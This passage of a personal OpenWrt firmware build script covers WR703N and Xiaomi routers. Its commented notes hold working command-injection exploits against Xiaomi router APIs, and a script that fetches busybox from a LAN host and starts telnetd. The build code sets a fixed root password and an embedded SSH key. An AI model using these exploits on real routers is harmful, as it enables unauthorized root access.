#!/usr/bin/env bash
set -o nounset -o pipefail -o errexit
readonly DIRNAME="$(readlink -f "$(dirname "$0")")"
readonly SCRIPTNAME=${0##*/}
VERSION+=("0b292549[2026-10-15T12:35:58+08:00]:build-openwrt.sh")
################################################################################
cat <<'EOF'
change repositories source from downloads.openwrt.org to mirrors.tuna.tsinghua.edu.cn:
    sed -i 's|downloads.openwrt.org|mirrors.aliyun.com/openwrt|g' repositories
    # 17.01.7
    sed -i 's|archive.openwrt.org|mirrors.aliyun.com/openwrt|g' repositories.conf
EOF
# etc/
# ├── banner
# ├── config/
# │   ├── dropbear
# │   └── system
# ├── dropbear/
# │   └── authorized_keys
# └── uci-defaults/
#kmod-usb-uhci kmod-usb-ohci PACKAGES="kmod-tun kmod-zram zram-swap block-mount kmod-fs-ext4 e2fsprogs kmod-usb2 kmod-usb-storage firewall -ip6tables -kmod-ip6tables -kmod-ipv6 -odhcp6c -swconfig "

: <<'EOF'
# mount jffs2 image!
umount /dev/mtdblock0 &>/dev/null
modprobe -r mtdram &>/dev/null
modprobe -r mtdblock &>/dev/null
modprobe mtdram total_size=32768 erase_size=$esize || exit 1
modprobe mtdblock || exit 1
dd if="$1" of=/dev/mtdblock0 || exit 1
mount -t jffs2 /dev/mtdblock0 $2 || exit 1
echo "Successfully mounted $1 on $2"
exit 0


firmware extrack user binwalk tools
MIR4A 100M
    miwifi_r4ac_firmware_e9eec_2.18.58.bin
    breed-mt7688-reset38.bin
  breed boot openwrt:
    1: telnet breed
    2: wget http://192.168.1.100/firmware.bin
    Connecting to 192.168.1.100:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8651000/0x8400f8 (8MB) []
    Saving to address 0x80000000

    3: flash erase 0x160000 0x850000
    4: flash write 0x160000 0x80000000 0x850000
    （0x160000为要写入firmware的目的地址， 0x80000000是下载的固件的保存地址， 0x200000比文件大一点）
    5: boot flash 0x160000 （0x160000启动地址）
    6: 断电重启路由器，breed还是会从0x50000处启动系统，进入breed的web界面，启用环境变量功能！这一步启动环境变量功能界面中，位置选择breed内部，设置启用后，需要重启。
    7: 再次进breed的web界面中，在环境变量界面，
        增加autoboot.command 字段，值boot flash 0x160000

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
print(r1.text)
# exec download speed test, exec command
print("start exec command...")
r2 = requests.get(
    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok),
    proxies=proxies
)
print(r2.text)
print("done! Now you can connect to the router using several options: (user: root, password: root)")
print("* telnet {}".format(router_ip_address))

speedtest_urls.xml:
<?xml version="1.0"?>
<root>
	<class type="1">
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
	</class>
	<class type="2">
		<item url="http://{router_ip_address} -q -O /dev/null;{command};exit;wget http://{router_ip_address} "/>
	</class>
	<class type="3">
		<item uploadurl="http://www.speedtest.cn/"/>
	</class>
</root>
script.sh:
    echo -e "root\nroot" | passwd root

    pgrep busybox | xargs kill || true
    cd /tmp
    rm -rf busybox
    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
    # https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel
    wget http://192.168.31.101:8080/busybox-mipsel -O /tmp/busybox
    chmod +x busybox
    cd /tmp
    ./busybox telnetd

###################################################################################################
备份eeprom (!!!!!!!!!!!)
dd if=/dev/mtd3 of=/tmp/eeprom.bin
mtd -r write /tmp/breed.bin Bootloader
进入breed后刷回eeprom.bin

breed web console : 按住reset键不放再插上电三秒松开->http://192.168.1.1

Xiaomi Mini
    In case you want to skip all the Xiaomi download etc, here are some instructions to flash directly OpenWRT/PandoraBox on stock firmware via code injection bug.
    https://mirom.ezbox.idv.tw/en/miwifi/R1CM/roms-stable/
NOTE
This method has been successfully tested on
-> Xiaomi Mini - Stock firmware v2.6.17
-> Xiaomi Lite aka "Youth" or "Nano" - Stock firmware v2.2.8

STEPS
1) Power on and setup the Xiaomi router until it reboots and gets IP address 192.168.31.1
2) Log-in into the router and grab the value of the stok URL parameter (for instance: "9c2428de4d17e2db7e5a6a337e6f57a3")
3) Replace the <STOK> placeholder and load this URL in your browser or curl, this will start telnetd on the router:
STOK=
curl -vvv "http://192.168.31.1/cgi-bin/luci/;stok=${STOK}/api/xqnetwork/set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&channel=1%3B%2Fusr%2Fsbin%2Ftelnetd

It should spit out some wifi error code, that is ok, don't worry.

4) Replace the <STOK> placeholder, the current password and the desired root password and load this URL in your browser or curl, this will set the router root password
PASSWD=
NEW_PASSWD=password
curl -vvv "http://192.168.31.1/cgi-bin/luci/;stok=${STOK}/api/xqsystem/set_name_password?oldPwd=${PASSWD}&newPwd=${NEW_PASSWD}"

It should spit out: {"code":0}

5) Telnet to the router, enter user root and NEWPASS chosen above.

6) wget your favourite .bin and flash with mtd -r write firmware.bin OS1
         mtd -r write /tmp/20140703.bin firmware

7) Router reboots wink

# Linux dialog with timeout & default No button
改SN 的方法如下
nvram set SN=你路由上的SN号
nvram set wl0_ssid=Xiaomi_XXXX_5G
nvram set wl1_ssid=Xiaomi_XXXX
保存
nvram commit
bdata set model=R1CM
bdata set color=101
bdata set CountryCode=CN
bdata set SN=你路由上的SN号
bdata set wl0_ssid=Xiaomi_XXXX_5G
bdata set wl1_ssid=Xiaomi_XXXX
保存
bdata sync && bdata commit
XXXX是你网卡的后四位，不知道的自己用手机下个WIFI软件看接入点去
然后重启下路由器，用手机看看能不能绑定成功，如果绑定成功啦，用http://192.168.XX.XX/cgi-bin/luci/;stok=XX/api/xqsystem/init_info XX.XX是你路由器的管理地址stok=XX是登陆路由以后的加密字符串，看下SN是不是你自己的啦。注意刷啦这个固件ROOT密码只能用我提供的，官网提供的用不了
EOF

DISABLED_SVC=(set-irq-affinity)
PACKAGES_REMOVE=()                                 #remove package
PACKAGES=()
PACKAGES+=(kmod-zram zram-swap)                    #zram swap

dialog() {
    local title="${1}"
    local menu="${2}"
    declare -a items=("${!3}")
    local item=$(whiptail --notags \
        --title "${title}" \
        --menu "${menu}" \
        0 0 10 \
        "${items[@]}" 3>&1 1>&2 2>&3 || true)
    echo -n "${item}"
}
ssh_key() {
    cat <<EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKxdriiCqbzlKWZgW5JGF6yJnSyVtubEAW17mok2zsQ7al2cRYgGjJ5iFSvZHzz3at7QpNpRkafauH/DfrZz3yGKkUIbOb0UavCH5aelNduXaBt7dY2ORHibOsSvTXAifGwtLY67W4VyU/RBnCC7x3HxUB6BQF6qwzCGwry/lrBD6FZzt7tLjfxcbLhsnzqOG2y76n4H54RrooGn1iXHBDBXfvMR7noZKbzXAUQyOx9m07CqhnpgpMlGFL7shUdlFPNLPZf5JLsEs90h3d885OWRx9Kp+O05W2gPg4kUhGeqO6IY09EPOcTupw77PRHoWOg4xNcqEQN2v2C1lr09Y9 root@yinzh
EOF
}
add_openssh_key() {
    ### Add SSH public key
    local dir="${1}"
    mkdir -p -m0700 "${dir}/root/.ssh"
    ssh_key > "${dir}/root/.ssh/authorized_keys"
    chmod 0600 "${dir}/root/.ssh/authorized_keys"
}
add_uci_default_lanip() {
    local rootfs="${1}"
    local lan_ipaddr="${2:-192.168.31.1}"
    mkdir -p -m0755 "${rootfs}/etc/uci-defaults"
    cat << EOF > ${rootfs}/etc/uci-defaults/00-network
uci set network.lan.ipaddr=${lan_ipaddr}
uci set network.lan.netmask=255.255.255.0
EOF
}
add_uci_default_password() {
    local rootfs="${1}"
    local pass="${2:-password}"
    mkdir -p -m0755 "${rootfs}/etc/uci-defaults"
    cat << EOF > "${rootfs}/etc/uci-defaults/99-passwd"
passwd << EOPWD
${pass}
${pass}
EOPWD
exit 0
EOF
}
add_uci_default_dropbear() {
    local rootfs="${1}"
    mkdir -p -m0755 "${rootfs}/etc/dropbear" "${rootfs}/etc/uci-defaults"
    cat << EOF >"${rootfs}/etc/uci-defaults/00-dropbear"
uci set dropbear.@dropbear[0].Port='60022'
uci set dropbear.@dropbear[0].Interface='lan'
uci set dropbear.@dropbear[0].IdleTimeout='600'
# uci set dropbear.@dropbear[0].RootPasswordAuth='off'
EOF
    ssh_key > "${rootfs}/etc/dropbear/authorized_keys"
    chmod 0600 "${rootfs}/etc/dropbear/authorized_keys"
}

add_shell_ps1() {
    cat <<EOF
export PS1="\[\033[1;31m\]\u\[\033[m\]@\[\033[1;32m\]\h:\[\033[33;1m\]\w\[\033[m\]$"
set -o vi
EOF
}
add_demo_vlan() {
    cat <<'EOF'
uci batch <<EO_CMD
    set network.switch0=switch
    set network.switch0.name='switch0'
    set network.switch0.reset='1'
    set network.switch0.enable_vlan='1'
EO_CMD
# vlan 1
# # No 't' on 1. Untagged packets become VLAN 1. 1t not
# # swconfig dev switch0 show | grep -i cpu
uci batch <<EO_CMD
    add network switch_vlan
    set network.@switch_vlan[-1].device='switch0'
    set network.@switch_vlan[-1].vlan='1'
    set network.@switch_vlan[-1].ports='0t 1'
EO_CMD
# vlan 2
uci batch <<EO_CMD
    add network switch_vlan
    set network.@switch_vlan[-1].device='switch0'
    set network.@switch_vlan[-1].vlan='2'
    set network.@switch_vlan[-1].ports='0t 2t'
EO_CMD
# 703n no switch chip, can not untagged to defaut tag(1), so add eth0 and tag1 togeter
uci set network.lan.ifname='eth0 eth0.1'
uci commit network
EOF
}
add_demo_wifi_sta_ap_slaac() {
    cat <<'EOF'
uci del system.ntp.server
uci add_list system.ntp.server='0.debian.pool.ntp.org'
uci add_list system.ntp.server='1.debian.pool.ntp.org'
uci set system.ntp.enabled='1'
#######################IPV6 slaac
# 1. Enable IPv6 assignment on the LAN interface (defines the prefix length)
# 2. Set the IPv6 router advertisement (RA) service to server mode
# 3. Set the IPv6 DHCPv6 service to server mode (optional, but standard)
# 4. Enable SLAAC by setting RA flags (Autonomous address configuration)
# 5. Configure RA flags to tell clients to use SLAAC
# 'managed' configures whether clients use DHCPv6 for IPs (0 = No, use SLAAC)
# 'other_config' configures whether clients get DNS/NTP via DHCPv6 (1 = Yes)
uci batch <<EO_CMD
    set network.lan.ip6assign='64'
    set dhcp.lan.ra='server'
    set dhcp.lan.dhcpv6='server'
    set dhcp.lan.ra_slaac='1'
    add_list dhcp.lan.ra_flags='managed-config'
EO_CMD
uci commit dhcp
uci commit network
/etc/init.d/network restart
/etc/init.d/odhcpd restart

#1. Remove all define
while uci delete wireless.@wifi-iface[0] 2>/dev/null; do :; done
# uci del wireless.radio0.disabled
uci set wireless.radio0.disabled='0'
uci commit wireless
#2. Create the STA (Client) connection
wifi_name=stadev
uci set wireless.${wifi_name}=wifi-iface
uci set wireless.${wifi_name}.device='radio0'
uci set wireless.${wifi_name}.mode='sta'
uci set wireless.${wifi_name}.disabled='0'
uci set wireless.${wifi_name}.network='wan wan6'
uci set wireless.${wifi_name}.ssid='outgoing_ssid'
uci set wireless.${wifi_name}.identity='user'
uci set wireless.${wifi_name}.password='****'
uci set wireless.${wifi_name}.encryption='wpa2'
uci set wireless.${wifi_name}.eap_type='peap'
uci set wireless.${wifi_name}.auth_inner='MSCHAPV2'
uci set wireless.${wifi_name}.phase1='peaplabel=auto tls_disable_tlsv1_0=0 tls_disable_tlsv1_1=0 tls_disable_tlsv1_2=0'
uci commit wireless
#3. Create the AP
wifi_name=apdev
uci set wireless.${wifi_name}=wifi-iface
uci set wireless.${wifi_name}.device='radio0'
uci set wireless.${wifi_name}.mode='ap'
uci set wireless.${wifi_name}.hidden=1
uci set wireless.${wifi_name}.disabled='0'
uci set wireless.${wifi_name}.network='lan'
uci set wireless.${wifi_name}.ssid='myssid'
uci set wireless.${wifi_name}.encryption='psk2'
uci set wireless.${wifi_name}.key='****'
uci commit wireless
#4. set wan/wan6 dhcp
uci set network.wan=interface
uci set network.wan.proto='dhcp'
uci set network.wan.device='wan'
uci commit network
#5. set wan/wan6 dhcp
uci set network.wan6=interface
uci set network.wan6.proto='dhcpv6'
uci set network.wan6.device='@wan'
uci set network.wan6.reqaddress='try'
uci set network.wan6.reqprefix='auto'
uci commit network

# # Enable 802.11r Fast Transition,(FT for fast roaming)
# uci set wireless.${wifi_name}.ieee80211r='1'
# uci set wireless.${wifi_name}.mobility_domain='abab'
# uci set wireless.${wifi_name}.ft_over_ds='0'
# uci set wireless.${wifi_name}.reassociation_deadline='20000'
# uci set wireless.${wifi_name}.ft_psk_generate_local='1'
# #• Action: same UCI commands on every single router.
# # • Multi-AP Settings: Ensure that the ssid, encryption, key (password), and mobility_domain (e.g., abab) are exactly identical across all devices.
# # • Wi-Fi Channels: For the best performance, make sure the routers are on different non-overlapping wireless channels (e.g., Router 1 on Channel 1, Router 2 on Channel 6, Router 3 on Channel 11 for 2.4GHz) so they don't fight for airspace.
EOF
}
add_demo() {
    cat <<'EOF'
# 域名劫持
uci add dhcp domain
uci set dhcp.@domain[-1].name='www.facebook.com'
uci set dhcp.@domain[-1].ip='1.2.3.4'
# Return 10.10.10.1 on query domain home and subdomain *.home
uci add_list dhcp.@dnsmasq[0].address="/home/10.10.10.1"
# Forward DNS queries for a specific domain and all its subdomains to a different server
uci add_list dhcp.@dnsmasq[0].server="/example.com/192.168.2.1"
# add dns server
uci delete dhcp.@dnsmasq[0].server
uci add_list dhcp.@dnsmasq[0].server="114.114.114.114"
uci add_list dhcp.@dnsmasq[0].server="8.8.4.4"
# if no dnsmasq. so : uci add_list network.wan.dns="8.8.4.4"
# Blacklist maybe Ad block
uci add_list dhcp.@dnsmasq[0].server="/example.com/"
# Whitelist
uci add_list dhcp.@dnsmasq[0].server="/example.com/#"
uci add_list dhcp.@dnsmasq[0].server="/#/"

uci commit dhcp
/etc/init.d/dnsmasq restart

# 更改dhcp DNS(6=DNS, 3=Default Gateway, 44=WINS)
uci set dhcp.@dnsmasq[0].dhcp_option='6,192.168.1.1,8.8.8.8'
uci commit dhcp
uci set dhcp.@dnsmasq[0].rebind_protection=0

uci add fstab swap
uci set fstab.@swap[0].device='/swapfile'
uci set fstab.@swap[0].enabled='1'
uci commit fstab

uci set fstab.@global[0].auto_mount=1
uci add fstab mount
uci set fstab.@mount[0].target=/media
uci set fstab.@mount[0].label=media
# uci set fstab.@mount[0].uuid=uuid
# uci set fstab.@mount[0].fstype=ext4
# uci set fstab.@mount[0].enabled_fsck=1
uci set fstab.@mount[0].options=ro
# ro,noatime...
uci set fstab.@mount[0].enabled=1
uci commit fstab

#disable dhcp on wwan
uci set dhcp.wwan=dhcp
uci set dhcp.wwan.interface='wwan'
uci set dhcp.wwan.ignore=1
uci commit dhcp

uci set network.lan.gateway='192.168.168.1'

# Configure pppoe connection
uci set network.wan.proto=pppoe
uci set network.wan.username='xx'
uci set network.wan.password='****'
uci commit
ifup wan

uci set network.wan.proto='static'
uci set network.wan.ipaddr='192.168.100.2'
uci set network.wan.netmask='255.255.255.0'
uci set network.wan.gateway='192.168.100.1'
uci set network.wan.dns='8.8.8.8 8.8.4.4'
uci commit network

uci set network.wan6='interface'
uci set network.wan6.device='@wan'             # Binds to the wan interface device
uci set network.wan6.proto='dhcpv6'
uci set network.wan6.reqaddress='try'
uci set network.wan6.reqprefix='auto'
uci commit network
ifup wan6

# 1. Ensure WAN zone covers both wan and wan6 network interfaces
uci set firewall.@zone[1].name='wan'
uci set firewall.@zone[1].network='wan wan6'
uci set firewall.@zone[1].masq='1'
uci set firewall.@zone[1].mtu_fix='1'
# 2. Enable IPv6 masquerading (NAT66) on the WAN zone if needed
uci set firewall.@zone[1].masq6='1'

# 3. Enable forwarding from LAN to WAN zone (if it doesn't already exist)
uci add firewall forwarding
uci set firewall.@forwarding[-1].src='lan'
uci set firewall.@forwarding[-1].dest='wan'

# 4. Commit and restart firewall
uci commit firewall
service firewall restart
EOF
}

add_demo_home_ap_default() {
    cat <<'EOFDFT'
uci rename firewall.@zone[0]=lan
uci rename firewall.@zone[1]=wan
uci commit
uci -q batch <<-EOF
set network.wg0=interface
set network.wg0.proto='wireguard'
set network.wg0.private_key='****'
add_list network.wg0.addresses='10.0.2.7/24'
set network.wg0.mtu='1420'

set network.wgserver=wireguard_wg0
set network.wgserver.public_key='****'
set network.wgserver.endpoint_host='1.1.1.174'
set network.wgserver.endpoint_port='50000'
set network.wgserver.route_allowed_ips='1'
set network.wgserver.persistent_keepalive='10'
add_list network.wgserver.allowed_ips='10.0.2.0/24'
EOF
uci add_list firewall.lan.network='wg0'
iptables -t nat -A POSTROUTING -s 192.168.31.0/24 -d 10.0.2.0/24 -o wg0 -j MASQUERADE
uci commit

uci -q batch <<-EOF
delete wireless.default_radio0
delete wireless.default_radio1
set wireless.radio0.disabled=0
set wireless.radio1.disabled=0

set network.wwan=interface
set network.wwan.proto='static'
set network.wwan.ipaddr='192.168.10.93'
set network.wwan.netmask='255.255.255.0'
set network.wwan.gateway='192.168.10.1'

set wireless.toup=wifi-iface
set wireless.toup.device='radio1'
set wireless.toup.network='wwan'
set wireless.toup.mode='sta'
set wireless.toup.ssid='s905d03'
set wireless.toup.encryption='psk'
set wireless.toup.key='****'

set wireless.mywifi5g=wifi-iface
set wireless.mywifi5g.device='radio0'
set wireless.mywifi5g.network='lan'
set wireless.mywifi5g.mode='ap'
set wireless.mywifi5g.encryption='psk2'
set wireless.mywifi5g.key='****'
set wireless.mywifi5g.ssid='johnap5g'

set wireless.mywifi2g=wifi-iface
set wireless.mywifi2g.device='radio1'
set wireless.mywifi2g.network='lan'
set wireless.mywifi2g.mode='ap'
set wireless.mywifi2g.encryption='psk2'
set wireless.mywifi2g.key='****'
set wireless.mywifi2g.ssid='johnap2g'

EOF
uci add_list firewall.wan.network=wwan
uci add_list dhcp.@dnsmasq[0].server='114.114.114.114'

cat<<EOF
# Configure firewall for if wg server mode
uci del_list firewall.lan.network="${WG_IF}"
uci add_list firewall.lan.network="${WG_IF}"
uci -q delete firewall.wg
uci set firewall.wg="rule"
uci set firewall.wg.name="Allow-WireGuard"
uci set firewall.wg.src="wan"
uci set firewall.wg.dest_port="${WG_PORT}"
uci set firewall.wg.proto="udp"
uci set firewall.wg.target="ACCEPT"
uci commit firewall
/etc/init.d/firewall restart
EOF
uci commit
EOFDFT
}
add_demo_lan_dhcp_static() {
    cat <<'EOF'
# # Create a secondary logical interface (wan) attached to the main LAN
uci set network.wan='interface'
uci set network.wan.device='@lan'
uci set network.wan.proto='dhcp'
uci set network.wan.defaultroute='1'
uci set network.wan.metric='10'
uci set network.wan.ifname='br-lan'
# ipv6
uci set network.wan6=interface
uci set network.wan6.proto='dhcpv6'
uci set network.wan6.device='@lan'
uci set network.wan6.reqaddress='try'
uci set network.wan6.reqprefix='auto'
uci set network.wan6.ifname='br-lan'
uci commit network
# add new AP
uci set wireless.radio0.disabled='0'
# del default ap
# uci del wireless.default_radio0
while uci delete wireless.@wifi-iface[0] 2>/dev/null; do :; done

wifi_name=apdev
uci set wireless.${wifi_name}=wifi-iface
uci set wireless.${wifi_name}.device='radio0'
uci set wireless.${wifi_name}.mode='ap'
uci set wireless.${wifi_name}.hidden=1
uci set wireless.${wifi_name}.network='lan'
uci set wireless.${wifi_name}.ssid='myssid'
uci set wireless.${wifi_name}.encryption='psk2'
uci set wireless.${wifi_name}.key='****'
uci commit wireless
EOF
}
add_demo_dnat() {
    cat <<'EOF'
#!/usr/bin/env sh
set -o nounset -o pipefail -o errexit

# # FullDNAT
nat_name=FullDNAT
dst_ip=192.168.168.2
# lan_net=$(eval $(ipcalc.sh $(uci get network.lan.ipaddr) $(uci get network.lan.netmask)) && echo "$NETWORK/$PREFIX")
IP=$(uci get network.lan.ipaddr)
MASK=$(uci get network.lan.netmask)
eval $(ipcalc.sh $IP $MASK)
src_ip="!${NETWORK}/${PREFIX}" # exclude cidr
uci set firewall.${nat_name}=redirect
uci set firewall.${nat_name}.name="${nat_name} FullDNAT"
uci set firewall.${nat_name}.proto='tcp udp'
uci set firewall.${nat_name}.src='wan'
uci set firewall.${nat_name}.src_ip="${src_ip}"
uci set firewall.${nat_name}.dest='lan'
uci set firewall.${nat_name}.dest_ip="${dst_ip}"
uci set firewall.${nat_name}.target='DNAT'
# # port redirect
nat_name=PortRedir
dst_ip=192.168.168.3
src_port=62222 #5000:5010/'80 443 8080'
dst_port=2222
uci set firewall.${nat_name}=redirect
uci set firewall.${nat_name}.name="${nat_name} Port Redirect"
uci set firewall.${nat_name}.src='wan'
uci set firewall.${nat_name}.proto='tcp'
uci set firewall.${nat_name}.src_dport="${src_port}"
uci set firewall.${nat_name}.dest='lan'
uci set firewall.${nat_name}.dest_ip="${dst_ip}"
[ -z "${dst_port:-}" ] || uci set firewall.${nat_name}.dest_port="${dst_port}"
EOF
}
add_demo_vlan_8021q() {
    cat <<'EOF'
#!/usr/bin/env sh
set -o nounset -o pipefail -o errexit

br_name=${1:?usage: prog.sh <brname> [eth]}
eth=${2:-} # eth0.10
DNS=${DNS:-'8.8.8.8,8.8.4.4'}

prompt() {
    local var="${1}"
    local msg="${2}"
    local tmout=${3:-}
    local nchars=${4:-}
    local value=""
    {
        trap "exit -1" SIGINT SIGTERM
        read ${nchars:+-n ${nchars}} ${tmout:+-t ${tmout}} -p "${msg}" value || true
        value="${value//\"/\'}";
    } 2>&1
    if [ ! -z "${value}" ]; then
        eval "${var}"=\"${value}\"
    fi
    echo ""
}
# # 17.01 uses dot-notation directly for 802.1q
uci -q get network.${br_name} || {
    prompt ipaddr "${br_name} ipaddr:"
    prompt netmask "${br_name} netmask:"
    uci set network.${br_name}=interface
    uci set network.${br_name}.type='bridge' # use bridge or NOT
    uci set network.${br_name}.proto='static'
    uci set network.${br_name}.ipaddr="${ipaddr}"
    uci set network.${br_name}.netmask="${netmask}"
    [ -z "${eth}" ] || uci set network.${br_name}.ifname="${eth}" #eth0.10(vlan 10), no ifname use nat mode
}
# # add ap
prompt wifiap_pass "${br_name}_ap password:"
uci -q set wireless.radio0.disabled='0' || true
uci -q set wireless.default_radio0.disabled='1' || true
uci set wireless.${br_name}_wifi=wifi-iface
uci set wireless.${br_name}_wifi.disabled='0'
uci set wireless.${br_name}_wifi.hidden=1
uci set wireless.${br_name}_wifi.device='radio0'
uci set wireless.${br_name}_wifi.mode='ap'
uci set wireless.${br_name}_wifi.ssid="${br_name}_ap"
uci set wireless.${br_name}_wifi.encryption='psk2'
uci set wireless.${br_name}_wifi.key="${wifiap_pass}"
uci set wireless.${br_name}_wifi.network="${br_name}"
# # add dhcp
uci -q get dhcp.${br_name} || {
    uci set dhcp.${br_name}=dhcp
    uci set dhcp.${br_name}.interface="${br_name}"
    uci set dhcp.${br_name}.start='100'
    uci set dhcp.${br_name}.limit='150'
    uci set dhcp.${br_name}.leasetime='12h'
    # add dns srv
    uci add_list dhcp.${br_name}.dhcp_option="6,${DNS}"
}
# # add fw output wan
uci set firewall.${br_name}=zone
uci set firewall.${br_name}.name="${br_name}"
uci set firewall.${br_name}.network="${br_name}"
uci set firewall.${br_name}.input='REJECT'   # Block clients from accessing router services by default
uci set firewall.${br_name}.output='ACCEPT'  # Allow traffic originating from the router out to ${br_name}
uci set firewall.${br_name}.forward='REJECT' # Block traffic forwarding between interfaces within this zone
# Allow zone to forward to WAN zone
uci add firewall forwarding
uci set firewall.@forwarding[-1].src="${br_name}"
uci set firewall.@forwarding[-1].dest='wan'
# Allow DHCP requests to the router
uci add firewall rule
uci set firewall.@rule[-1].name="Allow-${br_name}-DHCP"
uci set firewall.@rule[-1].src="${br_name}"
uci set firewall.@rule[-1].dest_port='67-68'
uci set firewall.@rule[-1].proto='tcp udp'
uci set firewall.@rule[-1].target='ACCEPT'
# Allow DNS requests to the router
uci add firewall rule
uci set firewall.@rule[-1].name="Allow-${br_name}-DNS"
uci set firewall.@rule[-1].src="${br_name}"
uci set firewall.@rule[-1].dest_port='53'
uci set firewall.@rule[-1].proto='tcp udp'
uci set firewall.@rule[-1].target='ACCEPT'
EOF
}
add_sysctl() {
    cat <<EOF
net.ipv4.ip_local_port_range = 1024 65531
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_tw_reuse = 0
EOF
}

choices=("tl-wr703n-v1" "WR703N" "xiaomi_miwifi-mini" "MiWIFI MINI" "xiaomi_mir4a-100m" "MiRouter 4A 100M")
id=$(dialog "Openwrt Select" "select model" choices[@])
case "$id" in
    ########################################
    tl-wr703n-v1) # 703N
        echo "-----------703n, 17.01.7 worked, 19.07.10 need del opkg infos, and noswap support"
        PACKAGES+=(block-mount kmod-usb-storage kmod-usb2) #usb storage
        PACKAGES+=(kmod-fs-exfat kmod-nls-base kmod-nls-cp437 kmod-nls-utf8)    #vfat ext4 support
        PACKAGES+=(wpad relayd)                            #other tools
        PACKAGES+=(wwan kmod-8021q kmod-veth kmod-ipip ipip)  #vlan support
        # opkg install chat comgt kmod-usb-acm kmod-usb-serial kmod-usb-serial-option kmod-usb-serial-wwan usb-modeswitch usb-modeswitch-data
        PACKAGES_REMOVE+=(-opkg -wpad-mini -hostapd-mini)
        DISABLED_SVC+=(relayd) # version 1701 not support disable svc
        # Makefile: add read_ for background, and modify
        # build_image: FORCE
        #   @echo Building images...
        #   @echo "Press [ENTER] to continue, or Ctrl+C to cancel..."
        #   @read _
        add_uci_default_dropbear "${DIRNAME}/mydir"
        add_uci_default_lanip "${DIRNAME}/mydir" "192.168.168.254"
        add_uci_default_password "${DIRNAME}/mydir" "password"
        cat << EOF > ${DIRNAME}/mydir/etc/uci-defaults/99-custom
uci rename firewall.@zone[0]=lan
uci rename firewall.@zone[1]=wan
uci set network.lan.ip6assign='64'
uci set network.wan='interface'
uci set network.wan.device='@lan'
uci set network.wan.proto='dhcp'
uci set network.wan.defaultroute='1'
uci set network.wan.metric='10'
uci set network.wan.ifname='br-lan'
uci set network.wan6=interface
uci set network.wan6.proto='dhcpv6'
uci set network.wan6.device='@lan'
uci set network.wan6.reqaddress='try'
uci set network.wan6.reqprefix='auto'
uci set network.wan6.ifname='br-lan'
uci del system.ntp.server
uci add_list system.ntp.server='0.debian.pool.ntp.org'
uci add_list system.ntp.server='1.debian.pool.ntp.org'
uci set system.ntp.enabled='1'
uci set system.@system[-1].hostname='wr703n'
uci set dhcp.@dnsmasq[0].cachesize='5000'
uci set dhcp.lan.ra_slaac='1'
#uci set dhcp.lan.ra_flags='managed-config'
uci del dhcp.lan.ra_flags
uci add_list dhcp.lan.ra_flags='managed-config'
uci add_list dhcp.lan.ra_flags='other-config'
EOF
        ;;
    xiaomi_miwifi-mini) # Mini
        PACKAGES+=(kmod-batman-adv kmod-geneve kmod-gre kmod-iptunnel kmod-l2tp kmod-macvlan kmod-pptp kmod-tun kmod-vxlan ip-full ipset)
        PACKAGES+=(kmod-wireguard wireguard-tools)         #wireguard
        PACKAGES+=(block-mount kmod-usb3 kmod-usb-storage-uas  kmod-usb-storage) #usb storage
        PACKAGES+=(kmod-fs-ext4 kmod-fs-vfat e2fsprogs)    #vfat ext4 support
        PACKAGES+=(kmod-fs-jfs kmod-fs-xfs)                #xfs jfs support
        PACKAGES+=(nfs-kernel-server nfs-kernel-server-utils) #NFS
        PACKAGES+=(openssh-client openssh-server openssh-sftp-server) #openssh
        PACKAGES+=(eject lsof procps-ng-ps socat sshfs dnsmasq-full nfs-utils kmod-veth relayd)
        PACKAGES+=(wpad-basic-mbedtls)
        PACKAGES_REMOVE+=(-dropbear -dnsmasq -wpad-mini -hostapd-mini)              #remove packages
        DISABLED_SVC+=(nfsd rpcbind relayd socat)
        # add_openssh_key "${DIRNAME}/mydir"
        add_uci_default_dropbear "${DIRNAME}/mydir"
        add_uci_default_lanip "${DIRNAME}/mydir" "192.168.31.1"
        add_uci_default_password "${DIRNAME}/mydir" "password"
        cat << EOF > ${DIRNAME}/mydir/etc/uci-defaults/99-custom
uci rename firewall.@zone[0]=lan
uci rename firewall.@zone[1]=wan
uci del system.ntp.server
uci add_list system.ntp.server='0.debian.pool.ntp.org'
uci add_list system.ntp.server='1.debian.pool.ntp.org'
uci set system.ntp.enabled='1'
uci set system.@system[-1].hostname='mimini'
uci set dhcp.@dnsmasq[0].cachesize='5000'
uci set dhcp.lan.ra_slaac='1'
uci del dhcp.lan.ra_flags
uci add_list dhcp.lan.ra_flags='managed-config'
uci add_list dhcp.lan.ra_flags='other-config'
EOF
        ;;
    xiaomi_mir4a-100m) # R4AC
        PACKAGES+=(kmod-batman-adv kmod-geneve kmod-gre kmod-iptunnel kmod-l2tp kmod-macvlan kmod-pptp kmod-tun kmod-vxlan ip-full ipset)
        PACKAGES+=(kmod-wireguard wireguard-tools)         #wireguard
        PACKAGES+=(aria2 rsync)                            #other tools
        PACKAGES+=(openssh-client openssh-server openssh-sftp-server) #openssh
        PACKAGES+=(jq lsof procps-ng-ps socat sshfs tcpdump tmux dnsmasq-full nfs-utils)
        PACKAGES_REMOVE+=(-dropbear -dnsmasq)              #remove packages
        DISABLED_SVC+=(socat)
        add_openssh_key "${DIRNAME}/mydir"
        add_uci_default_lanip "${DIRNAME}/mydir" "192.168.31.1"
        add_uci_default_password "${DIRNAME}/mydir" "password"
        cat << EOF > ${DIRNAME}/mydir/etc/uci-defaults/99-custom
uci rename firewall.@zone[0]=lan
uci rename firewall.@zone[1]=wan
uci del system.ntp.server
uci add_list system.ntp.server='0.debian.pool.ntp.org'
